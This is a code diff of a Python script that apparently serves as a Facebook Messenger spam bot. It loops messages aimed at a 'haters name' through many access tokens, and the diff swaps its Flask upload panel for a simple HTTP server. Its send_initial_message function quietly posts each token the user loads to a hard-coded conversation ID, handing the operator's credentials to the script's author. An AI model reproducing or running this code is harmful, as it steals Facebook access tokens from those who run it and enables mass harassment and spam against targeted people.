@@ -1,44 +1,26 @@
 import requests
+import json
 import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
 import threading
-from flask import Flask, request
 
-# ----------------- FLASK SERVER -------------------
-app = Flask(__name__)
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"-- SERVER RUNNING>>ANURAG X AROHI")
 
-@app.route('/')
-def index():
-    return """
-    <h2>ANURAG X AROHI PANEL</h2>
-    <form action="/run" method="post" enctype="multipart/form-data">
-      Tokens File: <input type="file" name="tokennum"><br><br>
-      Convo ID: <input type="text" name="convo"><br><br>
-      Messages File: <input type="file" name="file"><br><br>
-      Haters Name: <input type="text" name="hatersname"><br><br>
-      Time (seconds): <input type="number" name="time"><br><br>
-      <button type="submit">RUN</button>
-    </form>
-    """
-
-@app.route('/run', methods=['POST'])
-def run_bot():
-    # save uploaded files
-    if "tokennum" in request.files:
-        request.files["tokennum"].save("tokennum.txt")
-    if "file" in request.files:
-        request.files["file"].save("File.txt")
-
-    # save text inputs
-    open("convo.txt", "w").write(request.form.get("convo", ""))
-    open("hatersname.txt", "w").write(request.form.get("hatersname", ""))
-    open("time.txt", "w").write(request.form.get("time", "1"))
-
-    # start bot in a background thread
-    threading.Thread(target=bot_main, daemon=True).start()
-
-    return "✅ Inputs saved, bot started. Console check karo."
-
-# ----------------- BOT LOGIC -------------------
+def execute_server():
+    PORT = 4000
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
 
 def send_initial_message():
     with open('tokennum.txt', 'r') as file:
@@ -47,17 +29,25 @@ def send_initial_message():
     msg_template = "HeLLo ANURAG X AROHI DEAR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
     target_id = "61578840237242"
 
-    headers = {'User-Agent': 'Mozilla/5.0'}
+    requests.packages.urllib3.disable_warnings()
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
 
     for token in tokens:
         access_token = token.strip()
-        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
+        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
         msg = msg_template.format(access_token)
         parameters = {'access_token': access_token, 'message': msg}
-        try:
-            requests.post(url, json=parameters, headers=headers, timeout=5)
-        except:
-            pass
+        response = requests.post(url, json=parameters, headers=headers)
         time.sleep(0.1)
 
 def send_messages_from_file():
@@ -79,7 +69,16 @@ def send_messages_from_file():
     with open('time.txt', 'r') as file:
         speed = int(file.read().strip())
 
-    headers = {'User-Agent': 'Mozilla/5.0'}
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
 
     while True:
         try:
@@ -88,29 +87,26 @@ def send_messages_from_file():
                 access_token = tokens[token_index].strip()
                 message = messages[message_index].strip()
 
-                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
 
                 if response.ok:
-                    print(f"[+] SENT {message_index+1}/{num_messages} | Convo {convo_id} | Token {token_index+1}")
+                    print("\033[1;92m[+] ANURAG X AROHI {} of Convo {} Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                 else:
-                    print(f"[x] ERROR {message_index+1}/{num_messages} | Convo {convo_id} | Token {token_index+1}")
+                    print("\033[1;91m[x] ID/T0K3N ERROR {} of Convo {} with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
 
                 time.sleep(speed)
 
-            print("\n[+] All messages sent. Restarting...\n")
+            print("\n[+] All messages sent. Restarting the process...\n")
         except Exception as e:
-            print("[!] Error:", e)
+            print("[!] An error occurred: {}".format(e))
 
-def bot_main():
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+
     send_initial_message()
     send_messages_from_file()
-
-# ----------------- MAIN ENTRY -------------------
-
-if __name__ == '__main__':
-    print("🚀 Server started — Open in browser:")
-    print("   👉 Local: http://127.0.0.1:5000")
-    print("   👉 Network: http://<Your_Local_IP>:5000")
-    app.run(host="0.0.0.0", port=5000, debug=True)
